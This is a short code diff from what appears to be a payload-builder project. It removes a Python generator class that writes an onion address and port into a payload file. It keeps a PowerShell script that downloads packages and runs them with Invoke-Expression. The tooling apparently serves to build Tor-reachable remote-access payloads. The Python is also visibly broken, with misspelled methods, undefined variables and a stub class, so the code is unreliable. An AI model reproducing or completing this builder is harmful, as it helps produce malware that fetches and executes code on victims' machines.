@@ -1,30 +1,4 @@
-class Generator:
-    def __init__(self,payload,port,addr,outfile="payload.py"):
-        self.payload = payload
-        self.port = port
-        self.addr = addr
-        self.outfile = outfile
-
-    def createPaylad(self):
-        counter = 0
-        f = open(self.outfile,'w')
-        for lines in open(payload):
-            if lines.statswith("#const"):
-                counter = 2
-                continue
-            if counter == 2:
-                f.write("OnionUrl = " + self.addr)
-                continue
-            if counter == 1:
-                f.write("PORT = " + self.port)
-                continue
-            f.write(lines)
-        f.close()
-
-    def AddDownloadTor(self):
-        f = open(self.outfile,'w+')        
-        f.write("""
-        $source = 'C:\source' 
+$source = 'C:\source' 
 
 If (!(Test-Path -Path $source -PathType Container)) {New-Item -Path $source -ItemType Directory | Out-Null} 
 
@@ -58,14 +32,3 @@ foreach ($package in $packages) {
 
 Invoke-Expression -Command "$destinationPath $Arguments" 
 }
-        """)
-        f.write("f = open('DownloadTor.ps1,'w')'")
-        f.write("f.write(psfile)")
-        f.close()
-
-
-class compiler:
-    def __init__(self,infile,outfileformat,os):
-        print("hopefully do stuff")
-            
-    
